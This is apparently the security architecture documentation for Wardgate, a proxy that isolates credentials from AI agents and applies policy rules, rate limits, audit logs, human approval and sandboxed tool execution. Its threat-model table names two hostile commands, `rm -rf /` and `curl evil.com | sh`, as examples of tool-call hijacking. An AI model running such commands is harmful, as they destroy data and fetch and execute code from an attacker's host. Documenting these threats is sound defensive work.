# Wardgate Security Architecture

This document explains how Wardgate protects your credentials and controls AI agent access to external services.

## Overview

Wardgate is a security proxy that sits between AI agents and external services. It provides:

- **Credential Isolation** - Agents never see real credentials
- **Access Control** - Fine-grained rules for what agents can do
- **Conclaves** - Isolated remote execution environments for agent tool calls
- **Audit Logging** - Complete record of all agent activity
- **Approval Workflows** - Human-in-the-loop for sensitive operations
- **Rate Limiting** - Prevent runaway or abusive behavior

## Threat Model

### What We Protect Against

| Threat | How Wardgate Helps |
|--------|-------------------|
| Credential exposure in prompts | Credentials never reach the agent |
| Prompt injection attacks | Agent can only perform allowed actions |
| Rogue agent behavior | All requests logged and rate-limited |
| Data exfiltration | Policies restrict what data can be accessed |
| Sensitive data in responses | Response filtering blocks or redacts OTP codes, API keys, etc. -- including SSE streams |
| Accidental destructive actions | Require approval for sensitive operations or block them |
| SSRF via dynamic upstreams | Agent-provided upstream URLs validated against allowlist with scheme, host, and path checks |
| Tool call hijacking (e.g., `rm -rf /`, `curl evil.com \| sh`) | Conclaves isolate execution and evaluate each command against policy |

### What We Don't Protect Against

- Compromised Wardgate server / host (credentials live here)
- Malicious configuration (garbage in, garbage out)
- Side-channel attacks on the gateway itself
- Social engineering of human approvers

## Security Principles

### 1. Defense in Depth

Multiple layers protect your credentials:

```
┌─────────────────────────────────────────────────┐
│  Agent Environment                              │
│  • No credentials                               │
│  • Can only reach Wardgate                      │
└────────────────────┬────────────────────────────┘
                     │ Agent authenticates with its own key
                     ▼
┌─────────────────────────────────────────────────┐
│  Wardgate                                       │
│  • Validates agent identity                     │
│  • Evaluates policy rules                       │
│  • Rate limits requests                         │
│  • Validates dynamic upstream targets           │
│  • Filters sensitive data from responses/SSE    │
│  • Logs everything                              │
└────────────────────┬────────────────────────────┘
                     │ Wardgate injects real credentials
                     ▼
┌─────────────────────────────────────────────────┐
│  External Service (Todoist, Gmail, etc.)        │
└─────────────────────────────────────────────────┘
```

### 2. Least Privilege

Agents only get access to what they need:

- Define specific endpoints (not "all APIs")
- Restrict methods (GET only, no DELETE)
- Limit paths (only `/tasks`, not `/admin`)
- Time-bound access (business hours only)
- Dynamic upstreams limited to allowlisted host patterns
- Response filtering removes sensitive data before it reaches the agent

### 3. Explicit Over Implicit

Nothing happens automatically:

- Agents must explicitly use Wardgate
- Default policy is deny
- Sensitive actions require human approval
- All decisions are logged

### 4. Credential Separation

Credentials never leave the gateway:

- Stored in environment variables on gateway only
- Injected into requests at the last moment
- Never included in logs or error messages
- Never exposed via any API

## Architecture Components

### Request Flow

```
1. Agent sends request to Wardgate
   ┌─────────────────────────────────────────────┐
   │ GET /todoist-api/tasks                      │
   │ Authorization: Bearer <agent-key>           │
   └─────────────────────────────────────────────┘

2. Wardgate validates agent identity
   ┌─────────────────────────────────────────────┐
   │ Is this a valid agent key? ──► Yes          │
   └─────────────────────────────────────────────┘

3. Wardgate evaluates policy rules
   ┌─────────────────────────────────────────────┐
   │ Rule 1: GET /tasks* → allow    ──► Match!   │
   │ Rule 2: DELETE → deny                       │
   │ Rule 3: * → ask                             │
   └─────────────────────────────────────────────┘

4. Check rate limits
   ┌─────────────────────────────────────────────┐
   │ Agent has made 5/100 requests this minute   │
   │ ──► Under limit, proceed                    │
   └─────────────────────────────────────────────┘

5. Resolve upstream target
   ┌─────────────────────────────────────────────┐
   │ Static upstream from config?       ──► Yes  │
   │ Or: X-Wardgate-Upstream header?             │
   │   Validate against allowed_upstreams globs  │
   └─────────────────────────────────────────────┘

6. Inject credentials and forward
   ┌─────────────────────────────────────────────┐
   │ GET https://api.todoist.com/rest/v2/tasks   │
   │ Authorization: Bearer <real-api-key>        │
   └─────────────────────────────────────────────┘

7. Filter response and return
   ┌─────────────────────────────────────────────┐
   │ Scan for sensitive data (OTPs, API keys)    │
   │ SSE streams: filter per-message in realtime │
   │ Action: block, redact, or pass through      │
   └─────────────────────────────────────────────┘

8. Log
   ┌─────────────────────────────────────────────┐
   │ Log: agent=myagent endpoint=todoist-api     │
   │       method=GET path=/tasks decision=allow │
   │       status=200 duration=145ms             │
   └─────────────────────────────────────────────┘
```

### Policy Engine

The policy engine evaluates rules in order. First match wins.

```yaml
rules:
  - match: { method: GET, path: "/tasks*" }
    action: allow
    rate_limit: { max: 100, window: "1m" }
    
  - match: { method: POST, path: "/tasks" }
    action: allow
    time_range:
      hours: ["09:00-17:00"]
      days: ["mon", "tue", "wed", "thu", "fri"]
    
  - match: { method: DELETE }
    action: deny
    message: "Deletion not permitted"
    
  - match: { method: "*" }
    action: ask
```

### Credential Vault

Credentials are stored in environment variables:

```bash
# .env file (on gateway only, never shared with agents)
WARDGATE_CRED_TODOIST_API_KEY=abc123...
WARDGATE_CRED_GOOGLE_OAUTH_TOKEN=xyz789...
```

The vault:
- Reads credentials from environment at startup
- Never exposes credentials via any API
- Logs credential access (not values) for audit
- Supports credential rotation without restart

### Audit Logging

Every request is logged as structured JSON:

```json
{
  "ts": "2026-02-03T10:30:00Z",
  "request_id": "req_abc123",
  "agent": "my-agent",
  "endpoint": "todoist-api",
  "method": "GET",
  "path": "/tasks",
  "decision": "allow",
  "upstream_status": 200,
  "duration_ms": 145
}
```

Logs capture:
- Who (agent ID)
- What (method, path, endpoint)
- When (timestamp)
- Decision (allow/deny/ask)
- Outcome (upstream status, duration)

Logs do NOT capture:
- Request/response bodies (privacy)
- Credential values
- Sensitive headers

### Approval Workflow

For sensitive operations, Wardgate can require human approval:

```
1. Agent requests DELETE /tasks/123
2. Policy matches: action: ask
3. Wardgate sends notification (Slack/webhook)
   ┌─────────────────────────────────────────────┐
   │ 🔔 Approval Required                        │
   │                                             │
   │ Agent: my-agent                             │
   │ Action: DELETE /tasks/123                   │
   │ Endpoint: todoist-api                       │
   │                                             │
   │ [Approve] [Deny]                            │
   └─────────────────────────────────────────────┘
4. Human clicks Approve or Deny
5. Wardgate continues or blocks the request
6. On timeout → default deny
```

## Deployment Architecture

### Recommended Setup

```
┌────────────────────────────────────────────────┐
│              Private Network                   │
│                                                │
│   ┌──────────────┐       ┌──────────────┐      │
│   │  Agent VPS   │       │ Gateway VPS  │      │
│   │              │       │              │      │
│   │  • AI Agent  │──────▶│  • Wardgate  │─────▶ Internet
│   │  • No creds  │       │  • Has creds │      │
│   └──────────────┘       └──────────────┘      │
│                                                │
└────────────────────────────────────────────────┘
```

### Network Isolation

- Gateway only accessible from private network
- Firewall blocks direct internet access from agent
- All external traffic must go through gateway
- WireGuard or similar VPN for secure communication

### Gateway Hardening

- Minimal attack surface (single binary)
- No agent code runs on gateway
- Credentials encrypted at rest
- Regular security updates

## Best Practices

### 1. Different host

Put the gateway on a different host than the agent. This is the easiest way to isolate the agent from the gateway.

```
┌────────────────────────────────────────────────┐
│              Private Network                   │
│                                                │
│   ┌──────────────┐       ┌──────────────┐      │
│   │  Agent VPS   │       │ Gateway VPS  │      │
│   │              │       │              │      │
│   │  • AI Agent  │──────▶│  • Wardgate  │─────▶ Internet
│   │  • No creds  │       │  • Has creds │      │
│   └──────────────┘       └──────────────┘      │
│                                                │
└────────────────────────────────────────────────┘
```

### 2. Start Restrictive

Begin with deny-all, then add specific allows:

```yaml
rules:
  - match: { method: GET, path: "/tasks" }
    action: allow
  - match: { method: "*" }
    action: deny
```

### 3. Use Rate Limits

Prevent runaway agents:

```yaml
rules:
  - match: { method: GET }
    action: allow
    rate_limit: { max: 100, window: "1m" }
```

### 4. Require Approval for Writes

Be cautious with state-changing operations:

```yaml
rules:
  - match: { method: GET }
    action: allow
  - match: { method: POST }
    action: ask
  - match: { method: DELETE }
    action: deny
```

### 5. Time-Bound Access

Limit when agents can operate:

```yaml
rules:
  - match: { method: "*" }
    action: allow
    time_range:
      hours: ["09:00-18:00"]
      days: ["mon", "tue", "wed", "thu", "fri"]
```

### 6. Use Conclaves for Tool Calls

Isolate agent command execution in conclaves with per-conclave policy rules:

```yaml
conclaves:
  code:
    description: "Code repository"
    key_env: WARDGATE_CONCLAVE_CODE_KEY
    rules:
      - match: { command: "rg" }
        action: allow
      - match: { command: "git", args_pattern: "^(status|log|diff)" }
        action: allow
      - match: { command: "*" }
        action: deny
```

See [Conclaves](conclaves.md) for details.

### 7. Monitor Audit Logs

Regularly review agent activity:
- Look for unusual patterns
- Check for denied requests
- Verify approval decisions

## Comparison with Alternatives

| Approach | Credentials Exposure | Access Control | Audit |
|----------|---------------------|----------------|-------|
| Direct API access | Agent has full credentials | None | None |
| Environment variables | Agent sees credentials | None | None |
| Built-in agent permissions | Agent sees credentials | Yes, but agent-controlled | Varies |
| **Wardgate** | **Never exposed** | **Gateway-enforced** | **Complete** |

## Future Security Enhancements

- Response filtering (redact sensitive data)
- Anomaly detection (unusual patterns)
- Multi-gateway redundancy
- Hardware security module (HSM) integration
